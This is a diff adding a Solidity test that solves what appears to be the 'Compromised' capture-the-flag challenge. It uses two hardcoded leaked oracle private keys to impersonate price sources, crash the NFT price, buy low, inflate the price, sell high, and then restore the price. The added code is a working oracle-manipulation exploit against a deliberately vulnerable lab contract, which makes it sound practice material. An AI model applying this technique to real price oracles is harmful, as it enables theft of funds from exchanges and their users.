@@ -74,8 +74,42 @@ contract Compromised is Test {
         console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
     }
 
+    function exploitPrice(uint price, uint[2] memory keys) internal {
+	// I don't know how to sign transactions in solidity with another key,
+	// im just gonna prank as them, since i have the private key
+	for(uint8 i = 0; i < keys.length; ++i) {
+		address adr = vm.addr(keys[i]);
+		vm.startPrank(adr);
+		trustfulOracle.postPrice("DVNFT", price);
+		vm.stopPrank();
+	}
+    }
+
     function testExploit() public {
         /** EXPLOIT START **/
+
+	// at first i was unable to decode the hex to anything useful but the
+	// MHhj... seemed too good to leave alone (also i couldnt find any vulns)
+	uint[2] memory keys = [ 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9, 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48 ];
+	//emit log_address(vm.addr(keys[0])); // source[1]
+	//emit log_address(vm.addr(keys[1])); // source[2]
+
+	exploitPrice(0, keys);
+
+	vm.startPrank(attacker);
+	uint id = exchange.buyOne{value: 1}();
+	vm.stopPrank();
+
+	exploitPrice(9990 ether, keys);
+
+	vm.startPrank(attacker);
+	damnValuableNFT.approve(address(exchange), id);
+	exchange.sellOne(id);
+	vm.stopPrank();
+
+	// the individual prices might be different but since we have a
+	// majority we can make the median the same this way
+	exploitPrice(INITIAL_NFT_PRICE, keys);
 
         /** EXPLOIT END **/
         validation();
